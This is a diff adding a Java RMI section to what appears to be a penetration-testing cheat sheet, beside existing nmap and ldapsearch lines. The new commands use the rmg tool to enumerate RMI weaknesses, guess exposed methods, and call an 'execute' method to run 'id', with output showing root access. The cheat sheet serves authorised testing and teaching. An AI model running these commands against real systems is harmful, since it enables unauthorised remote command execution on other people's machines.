@@ -376,6 +376,27 @@ $ nmap -p389 -n -sV --script "ldap* and not brute" [target]
 $ ldapsearch -x -b "dc=acme,dc=com" "*" -h [target]
 ```
 
+### Java RMI (Remote Method Invocation)
+
+Java RMI is an object-orientated RPC mechanism that allows an object in a JVM to call methods in another JVM.
+
+```
+# Enum common RMI vulnerabilities
+$ rmg enum [target] [rmi_port]
+
+# Enum RMI methods
+$ rmg guess [target] [rmi_port]
+[+] Listing successfully guessed methods:
+[+] 	- plain-server2 == plain-server
+[+] 		--> String execute(String dummy)
+
+# Call methods enum'd above
+$ rmg call [target [rmi_port] '"id"' \
+    --bound-name plain-server \
+    --signature "String execute(String dummy)" \
+    --plugin GenericPrint.jar
+[+] uid=0(root) gid=0(root) groups=0(root)
+```
 
 ### MSSQL [1433 TCP]
 
